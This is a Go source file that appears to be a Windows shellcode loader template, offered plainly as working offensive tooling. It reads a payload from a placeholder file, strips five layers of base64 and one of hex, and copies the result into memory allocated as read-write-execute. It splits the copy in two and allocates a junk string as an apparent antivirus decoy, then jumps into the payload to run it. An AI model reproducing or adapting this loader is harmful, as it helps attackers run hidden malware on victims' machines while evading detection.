package separate

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"os"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")
	ntdll         = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
)

func checkErr(err error) {
	if err != nil {
		if err.Error() != "The operation completed successfully." {
			println(err.Error())
			os.Exit(1)
		}
	}
}

func Readcode() string {
	f, err := ioutil.ReadFile("__SHELLCODE__")
	if err != nil {
		fmt.Println("read fail", err)
	}
	return string(f)
}

func Base64DecodeString(str string) string {
	resBytes, _ := base64.StdEncoding.DecodeString(str)
	return string(resBytes)
}

func main() {

	var c string = "QWEIHSANDAOVSAUNPFLDMGKOSUADNLGKDNASODAINSKLGNSAIFD/.ASVDODVUNDADKGSLBIHFOINERQENKDSMLSA[LWEPQKPOKEORKOQOWIHSANJAFOAGHASPKJPOADMEKOMDMQWPODPOKOKSAGAS-E215311-21435-3EFAS-R0JI@Glacier"
	addr1, _, err := VirtualAlloc.Call(0, uintptr(len(c)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)

	_, _, err = RtlCopyMemory.Call(addr1, (uintptr)(unsafe.Pointer(&c)), uintptr(len(c)/2))

	b := Readcode()
	for i := 0; i < 5; i++ {
		b = Base64DecodeString(b)
	}
	shellcode, err := hex.DecodeString(b)

	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		checkErr(err)
	}
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)/2))
	_, _, err = RtlCopyMemory.Call(addr+uintptr(len(shellcode)/2), (uintptr)(unsafe.Pointer(&shellcode[len(shellcode)/2])), uintptr(len(shellcode)/2))
	checkErr(err)

	syscall.Syscall(addr, 0, 0, 0, 0)

}
